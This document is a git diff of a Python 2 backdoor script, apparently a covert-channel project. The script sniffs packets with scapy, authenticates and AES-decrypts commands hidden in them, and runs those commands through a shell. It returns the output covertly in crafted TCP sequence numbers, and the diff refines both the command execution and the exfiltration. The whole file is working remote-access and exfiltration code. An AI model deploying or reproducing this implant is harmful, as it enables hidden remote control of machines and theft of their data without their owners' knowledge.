@@ -2,9 +2,10 @@ from scapy.all import *
 from Crypto.Cipher import AES
 import uuid
 import time
+import subprocess
 
 # Inputs
-localIP = "192.168.0.15"
+localIP = "192.168.0.23"
 ttlKey = 164
 srcPort = 80
 dstPort = 53
@@ -12,6 +13,7 @@ key = "0123456789abcdef"
 IV = "abcdefghijklmnop"
 messages = []
 authentication = "TEST!"
+# clientIP = "192.168.0.22"
 
 
 def decrypt(command):
@@ -51,7 +53,7 @@ def addToMessages(messages, UID, total, covertContent):
             pass
         # If NONE of the elements have the same UID, create a
         # new entry
-        print "There are no elements with the same UID"
+        #print "There are no elements with the same UID"
         element = [UID, [int(total)], [covertContent]]
         messages.append(element)
 
@@ -137,6 +139,8 @@ def handle(packet):
     #TODO: FIX THIS
     if(packet[IP].src != localIP):
         if authenticate(packet):
+            global clientIP
+            clientIP = packet[IP].src
             payload = decrypt(packet["Raw"].load).split("\n")
             # print "Payload"
             # print payload
@@ -176,10 +180,8 @@ def handle(packet):
                     print "COMMAND: " + command
                     #Delete that command from the list
                     deleteCommand(UID)
-                    global clientIP
-                    clientIP = "192.168.0.16"
                     result = runCommand(command)
-                    print "Result is " + result
+                    #print "Result is " + result
                     #threaad.sleep(5)
                     sendmessage("TCP",result)
                     #Run the command
@@ -189,13 +191,13 @@ def handle(packet):
 ############################################SENDING BACK###################
 #Conver the message to ascii to bits
 def messageToBits(message):
-    print "The message is " + message
+    # print "The message is " + message
     messageData =""
     for c in message:
         #bin(int(messageData))[2:]
         # print "Char code is " + str(ord(c))
         var = bin(ord(c))[2:].zfill(8)
-        print var
+        # print var
         messageData += str(var)
     # print "Message data is " + messageData
     return messageData
@@ -206,20 +208,20 @@ def chunkMessage(message,protocol):
 		length = 32
     elif(protocol == "UDP"):
 		length = 16
-    print str(len(message))
+    # print str(len(message))
 
     if(len(message) == length ):
-        print "chunkMessage:The length of the message is the same as the max"
+        # print "chunkMessage:The length of the message is the same as the max"
         output = []
         output.append(message)
         return message
     elif(len(message) <= length):
-        print "chunkMessage:The length of the message is less than the max so "\
-        "prepend"
+        # print "chunkMessage:The length of the message is less than the max so "\
+        # "prepend"
         return message.zfill(length)
     elif(len(message) > length):
-        print "chunkMessage: The length is greater than the max, so will be "\
-        "excess"
+        # print "chunkMessage: The length is greater than the max, so will be "\
+        # "excess"
         #What will be left over after we chunk the length bit chunks
         rounds = len(message) / length
         excess = len(message) % length
@@ -229,14 +231,14 @@ def chunkMessage(message,protocol):
         start = 0
         end = 0
         while(i < rounds):
-            print "ROUND:  #" + str(i)
+            #print "ROUND:  #" + str(i)
             # print "This is round" + str(i)
             start = i*length #0
             # print "START: " + str(start)
             end = (i*length)+(length - 1) #31
             # print "END: " + str(end)
             output.append(message[start:end+1])
-            print "Appending " + str(message[start:end+1])
+            #print "Appending " + str(message[start:end+1])
             i = i + 1
             # print "END OF ROUND " + str(output)
             # print "LENGTH OF ROUND IS " + str(len(message[start:end+1]))
@@ -244,12 +246,11 @@ def chunkMessage(message,protocol):
         if(excess > 0):
             output.append(message[(end+1):(end+1+excess)])
         # print output
-
         return output
 
 def generateUID():
     uid = uuid.uuid1()
-    print 'Made a UID ' + str(uid)
+    #print 'Made a UID ' + str(uid)
     return str(uid)
 
 
@@ -260,9 +261,9 @@ def craftPackets(data,protocol):
     #Create a UID to put in every packet, so that we know what session the
     #Packets are part of
     UID = generateUID()
-    print "The number of messages to send is " + str(len(data))
+    #print "The number of messages to send is " + str(len(data))
     while (counter < len(data)):
-        print str(data[counter])
+        #print str(data[counter])
         packets.append(craftPacket(data[counter],protocol,counter+1,len(data),UID))
         counter = counter + 1
 
@@ -278,9 +279,9 @@ def craftPacket(data,protocol,position,total,UID):
     global password
     global authentication
 
-    print "Data is " + str(data)
+    #print "Data is " + str(data)
 
-    print "Crafting packet for # " + str(position) + " / " + str(total)
+    #print "Crafting packet for # " + str(position) + " / " + str(total)
     if(protocol == "TCP"):
         #print "Put Data " + str(int(data,2)) + "into Seq Number"
         packet = IP(dst=clientIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
@@ -302,25 +303,25 @@ def sendmessage(protocol,message):
 	#1. Encrypt the message
 	#2. Convert message to ASCII to Bits
     message = messageToBits(message)
-    print "Message is " + message
+    #print "Message is " + message
     #3. Chunk message into the size appropriate for the protocol
     chunks = chunkMessage(message,protocol)
-    print "Chunks are " + str(chunks)
+    #print "Chunks are " + str(chunks)
 	#4. Craft packets
     packets = craftPackets(chunks,protocol)
 
 	#5. Send the packets
     for packet in packets:
-        send(packet)
+        send((packet),verbose=0)
         pass
 
 def runCommand(command):
     command = command.replace("\0", '')
-    f = os.popen(str(command))
-    result = f.read()
+    f = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    result = f.stdout.read() + f.stderr.read()
     if result == "":
         result = "ERROR or No Output Produced"
     #print "Output is " + result
     return result
 
-sniff(filter="ip and host 192.168.0.15", prn=handle)
+sniff(filter="ip and host 192.168.0.22", prn=handle)
